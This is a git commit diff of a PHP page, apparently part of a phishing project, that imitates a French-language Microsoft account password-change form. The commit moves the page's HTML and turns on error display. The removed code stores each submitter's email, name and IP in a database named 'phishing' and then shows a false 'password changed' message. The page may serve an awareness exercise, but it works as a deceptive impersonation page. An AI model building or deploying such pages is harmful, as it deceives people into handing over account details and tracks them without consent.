dba4f29f21a89557d31e3128460c875c845ab28f
Beemo <161473712+Beemo44@users.noreply.github.com>
2025-06-03 19:41:19 +0200

    debug for linux

--- V2/password_form.php
+++ V2/password_form.php
@@ -10,8 +10,60 @@
     
 
 </head>
+<body>
 
+    <nav>
+        <div class="microsoft">
+            <img class="burger" src="./menu.png" alt="menu">
+        </div>
+        <div class="menu">
+            <p><b>Compte microsoft</b></p>
+            <div class="stick"></div>
+            <p>Vos informations</p>
+            <p>Confidentialité</p>
+            <p>Sécurité</p>
+            <p>Rewards</p>
+            <p>Paiement et facturation</p>
+            <p>Service et abonnement</p>
+            <p>Appareils</p>
+        </div>
+    </nav>
+<div class="main">
+    <p id="title">Modifier votre mot de passe</p>
+    <p id="tips">Un mot de passe fort empêche l'accès non autorisé à votre compte Windows Live. </p>
+        <form action="password_form.php" method="POST">
+            <div class="c100">
+                <p>Adresse mail</p>
+                <label for="mail"></label>
+                <input placeholder="Adresse mail" type="email" id="mail" name="mail">
+            </div>
+            <div class="c101">
+                <p>Mot de passe actuel</p>
+                <label for="actual_password"></label>
+                <input placeholder="Mot de passe actuel" type="password" id="actual_password" name="actual_password">
+                <p class="forgot_password">Vous avez oublié votre mot de passe ?</p>
+            </div>
+            <div class="c102">
+                <p><b>Nouveau mot de passe</b></p>
+                <label for="new_password"></label>
+                <input placeholder="Nouveau mot de passe" type="password" id="new_password" name="new_password">
+                <p id="type_of_password">8 caractères minimum ; différencier majuscules et minuscules</p>
+            </div>
+            <div class="c103">
+                <p><b>Confirmer votre nouveau mot de passe</b></p>
+                <label for="confirm_new_password"></label>
+                <input placeholder="Confirmer votre nouveau mot de passe" type="password" id="confirm_new_password" name="confirm_new_password">
+                
+            </div>
+
+            <div class="c104" >
+                <input id="submit" name="submit" type="submit" value="Enregistrer">
+            </div>
 <?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);  
 
 
 //Compteur de visite du site dans un fichier .txt
@@ -151,118 +203,5 @@ catch(PDOException $e){
 
 
 ?>
-<body>
-
-    <nav>
-        <div class="microsoft">
-            <img class="burger" src="./menu.png" alt="menu">
-        </div>
-        <div class="menu">
-            <p><b>Compte microsoft</b></p>
-            <div class="stick"></div>
-            <p>Vos informations</p>
-            <p>Confidentialité</p>
-            <p>Sécurité</p>
-            <p>Rewards</p>
-            <p>Paiement et facturation</p>
-            <p>Service et abonnement</p>
-            <p>Appareils</p>
-        </div>
-    </nav>
-<div class="main">
-    <p id="title">Modifier votre mot de passe</p>
-    <p id="tips">Un mot de passe fort empêche l'accès non autorisé à votre compte Windows Live. </p>
-        <form action="password_form.php" method="POST">
-            <div class="c100">
-                <p>Adresse mail</p>
-                <label for="mail"></label>
-                <input placeholder="Adresse mail" type="email" id="mail" name="mail">
-            </div>
-            <div class="c101">
-                <p>Mot de passe actuel</p>
-                <label for="actual_password"></label>
-                <input placeholder="Mot de passe actuel" type="password" id="actual_password" name="actual_password">
-                <p class="forgot_password">Vous avez oublié votre mot de passe ?</p>
-            </div>
-            <div class="c102">
-                <p><b>Nouveau mot de passe</b></p>
-                <label for="new_password"></label>
-                <input placeholder="Nouveau mot de passe" type="password" id="new_password" name="new_password">
-                <p id="type_of_password">8 caractères minimum ; différencier majuscules et minuscules</p>
-            </div>
-            <div class="c103">
-                <p><b>Confirmer votre nouveau mot de passe</b></p>
-                <label for="confirm_new_password"></label>
-                <input placeholder="Confirmer votre nouveau mot de passe" type="password" id="confirm_new_password" name="confirm_new_password">
-                
-            </div>
-
-            <div class="c104" >
-                <input id="submit" name="submit" type="submit" value="Enregistrer">
-            </div>
-            
-            <?php
-
-            //Récupération des données rentré dans les champs
-            if ((!empty($_POST['submit'])) && $_POST["new_password"] == $_POST["confirm_new_password"]){
-
-
-                
-                $serveur = "localhost";
-                $dbname = "phishing";
-                $user = "root";
-                $pass = "";
-    
-                $mail = $_POST["mail"];
-                $name = $userconnected;
-                $ip= $_SERVER['REMOTE_ADDR'];
-                $date = date('Y-m-d');
-                try{
-                 //On se connecte à la BDD
-                    $dbco = new PDO("mysql:host=$serveur;dbname=$dbname",$user,$pass);
-                    $dbco->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-
-        
-                    //On insère les données reçues
-                    $sth = $dbco->prepare("
-                        INSERT INTO pescado(mail, name, ip, date_visit)
-                        VALUES(:mail, :name, :ip, :date_visit)");
-                    $sth->bindParam(':mail',$mail);
-                    $sth->bindParam(':name',$name);
-                    $sth->bindParam(':ip',$ip);
-                    $sth->bindParam(':date_visit',$date);
-                    $sth->execute();
-        
-        
-                }
-                catch(PDOException $e){
-                    echo 'Impossible de traiter les données. Erreur : '.$e->getMessage();
-                }
-                echo ("
-                <div class = 'thanks' >
-                <h1>Mot de passe bien changé !</h1>
-                Merci d’avoir pris le temps de sécurisé votre compte ! 
-                </div>");
-            
-            }
-            elseif ((!empty($_POST['submit'])) && ($_POST["new_password"] != $_POST["confirm_new_password"])){
-
-
-                echo ("<h3 class='thanks'>Les mots de passes sont différents ! </h3>");
-
-
-            }
-                
-            
-            ?>
-
-            
-        </form>
-
-</div>
-
-
-
-
 </body>
 </html>
